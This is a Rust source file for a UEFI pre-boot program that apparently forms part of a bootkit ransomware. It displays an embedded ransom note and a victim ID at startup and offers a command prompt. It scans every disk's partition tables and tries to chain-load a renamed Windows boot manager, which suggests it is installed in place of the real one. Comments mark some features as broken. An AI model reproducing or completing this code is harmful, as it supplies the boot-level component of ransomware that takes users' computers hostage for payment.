#![no_main]
#![no_std]
#![feature(abi_efiapi)]
#![feature(slice_as_chunks)]

mod mbr;
mod gpt;

extern crate alloc;

use core::fmt::Write;
use alloc::boxed::Box;
use uefi::prelude::*;
use uefi::{Char16, Event, ResultExt};
use uefi::proto::console::text::{Color, Key};
use alloc::string::{String, ToString};
use alloc::{fmt, vec};
use alloc::vec::Vec;
use core::alloc::Layout;
use core::ops::Deref;
use core::str;
use log::log;
use uefi::exts::allocate_buffer;
use uefi::proto::media::block::BlockIO;
use uefi::proto::media::file::{Directory, File, FileAttribute, FileInfo, FileMode};
use uefi::proto::media::fs::SimpleFileSystem;
use uefi::table::runtime::ResetType;
use crate::gpt::{GPTDisk, GPTHeader};
use crate::mbr::MBR;

fn init_screen(st: &mut SystemTable<Boot>) {
    st.stdout().clear().unwrap().unwrap();
    st.stdout().enable_cursor(true).unwrap_success();
    st.stdout().set_color(Color::Red, Color::Black).unwrap_success();
    st.stdout().write_str(include_str!("ransom_note.txt")).unwrap();

    match read_file(&st, "id") {
        Ok(buf) => {
            let content = str::from_utf8(&buf).unwrap();
            st.stdout().write_str(content).unwrap();
        },
        Err(_) => { st.stdout().write_str("File not found").unwrap(); }
    }

    st.stdout().write_str("\n> ").unwrap();
}

fn get_last_dir(st: &SystemTable<Boot>, dirpath: Vec<&str>) -> Result<Directory, ()> {
    // Get the file system protocol
    let fs = st
        .boot_services()
        .locate_protocol::<SimpleFileSystem>()
        .unwrap_success();
    let fs = unsafe { &mut *fs.get() }; // Unsafe because we need to use the raw pointer

    // Open root directory of EFI System Partition
    let mut root = fs.open_volume().unwrap_success();

    for dirname in dirpath {
        let dir_handle = match root.open(dirname, FileMode::Read, FileAttribute::empty()) {
            Ok(file) => file.unwrap(),
            _ => return Err(()), // Directory not found
        };
        root = match dir_handle.into_type().unwrap_success() {
            uefi::proto::media::file::FileType::Dir(d) => d,
            _ => return Err(()), // Directory is not a regular file
        };
    }

    Ok(root)
}

fn read_file(st: &SystemTable<Boot>, filepath: &str) -> Result<Box<[u8]>, ()> {
    let filepath_array = filepath.split('\\');
    let mut filepath_array = filepath_array.collect::<Vec<&str>>();

    //let filename = filepath_array.clone().last().unwrap();
    let filename = filepath_array.pop().unwrap();

    let mut root = match get_last_dir(&st, filepath_array) {
        Ok(r) => r,
        Err(_) => return Err(())
    };

    // Get file handle
    let text_file_handle = match root.open(filename, FileMode::Read, FileAttribute::empty()) {
        Ok(file) => file.unwrap(),
        _ => return Err(()), // File not found
    };
    let mut text_file = match text_file_handle.into_type().unwrap_success() {
        uefi::proto::media::file::FileType::Regular(f) => f,
        _ => return Err(()), // File is not a regular file
    };

    // Read file size
    let mut buf = [0; 500];
    let text_info: &mut FileInfo = text_file.get_info(&mut buf).unwrap_success();
    let text_size = text_info.file_size() as usize;

    // Allocate a buffer for the file contents with a proper alignment
    let buf_layout = Layout::array::<u8>(text_size).unwrap();
    let mut buf = allocate_buffer(buf_layout);

    // Read file content into buffer
    text_file.read(&mut buf).unwrap_success();

    // Close file handle
    text_file.close();

    Ok(buf)
}

fn take_input(image_handle: &Handle, system_table: &mut SystemTable<Boot>, char_16: Char16, buffer: &mut String) {
    let mut st = unsafe {system_table.unsafe_clone()};
    let stdout = system_table.stdout();
    let char_key = char::from(char_16);
    match char_key {

        // When user press [Enter]
        '\r' => {
            if buffer == "clear" {
                stdout.clear().unwrap_success();
                init_screen(&mut st);
                buffer.clear();
            } else if buffer == "test" {

                let handles = system_table
                    .boot_services()
                    .find_handles::<BlockIO>()
                    .expect_success("failed to find handles for `BlockIO`");

                for handle in handles {
                    let blk = system_table
                        .boot_services()
                        .handle_protocol::<BlockIO>(handle)
                        .expect_success("Failed to get BlockIO protocol");

                    let blk = unsafe {&* blk.get()};

                    let blk_media = blk.media();
                    let media_id = blk_media.media_id();
                    let block_size = blk_media.block_size();
                    //let last_block = blk_media.last_block();
                    let low_lba = blk_media.lowest_aligned_lba();

                    let mut buf: Vec<u8> = vec![0u8; block_size as usize];

                    blk.read_blocks(media_id, low_lba, &mut buf).unwrap_success();

                    let data= buf.as_slice();
                    let mbr_blk = match MBR::new(data, media_id) {
                        Ok(m) => {
                            if m.is_gpt_pmbr() { m } else { continue }
                        },
                        Err(_) => continue
                    };

                    //blk.read_blocks(media_id, 1, &mut buf).unwrap_success();
                    //let first_usable_lba = u64::from_ne_bytes(buf[40..48].try_into().unwrap());
                    //let partition_entry = u64::from_ne_bytes(buf[72..80].try_into().unwrap());
                    let gpt_disk = GPTDisk::new(blk, media_id, block_size, &mut buf);
                    let guid = gpt_disk.partitions()[0].part_type_guid.to_string();

                    log::info!("{}", guid);

                    //let p1 = gpt_disk.partitions()[0];
                    //log::info!("{}", p1.part_type_guid);
                    //let gpt = GPTDisk::new(blk, media_id, block_size, &mut buf);
                    //log::info!("{:#?}", &buf[80..88]);
                    //log::info!("{}", first_usable_lba);
                    //log::info!("{}", partition_entry);
                }

            } else if buffer == "boot" {
                // The whole thing doesn't work

                let windows_efi = match read_file(&system_table, "EFI\\Microsoft\\Boot\\bootmgfw.old.efi") {
                    Ok(t) => t,
                    Err(_) => panic!("Windows efi file not found")
                };

                let windows_handle = match system_table
                    .boot_services()
                    .load_image_from_buffer(*image_handle, windows_efi.deref()) {
                    Ok(h) => h.unwrap(),
                    Err(e) => {
                        log::info!("Load image : KO : {:#?}", e);
                        panic!()
                    }
                };

                match system_table.boot_services().start_image(windows_handle) {
                    Ok(_) => log::info!("OK"),
                    Err(e) => log::info!("Start image : KO : {:#?}", e) //TODO: That doesn't work !!
                }

            }
            else if buffer == "windows" {

                system_table.runtime_services().reset(
                    ResetType::Shutdown,
                    Status::SUCCESS,
                    Some(&[])
                );

            } else if buffer == "shutdown" {

                system_table.runtime_services().reset(
                    ResetType::Shutdown,
                    Status::SUCCESS,
                    Some(&[])
                );

            } else {
                stdout.write_char('\n').unwrap();
                stdout.write_str(buffer.as_str()).unwrap();
                stdout.write_str("\n> ").unwrap();
                buffer.clear();
            }
        }

        // When user press [Backspace]
        '\x08' => {
            if buffer.len() == 0 { return; } else {
                buffer.pop();
                stdout.write_char(char_key).unwrap();
            }
        }

        // Whatever character
        _ => {
            buffer.push(char_key);
            stdout.write_char(char_key).unwrap();
        }
    }
}

fn wait_for_input(boot_services: &BootServices, events: &mut [Event; 1]) {
    boot_services.wait_for_event(events).unwrap().unwrap();
}

#[entry]
fn main(handle: Handle, mut st: SystemTable<Boot>) -> Status {
    uefi_services::init(&mut st).unwrap_success();

    init_screen(&mut st);
    let mut buffer: String = String::from("");

    let mut key_event = unsafe { [st.stdin().wait_for_key_event().unsafe_clone()] };

    loop {
        wait_for_input(st.boot_services(), &mut key_event);
        if let Some(Key::Printable(key)) = st.stdin().read_key().unwrap_success() {
            take_input(&handle, &mut st, key, &mut buffer);
        }
    }

    //Status::SUCCESS
}
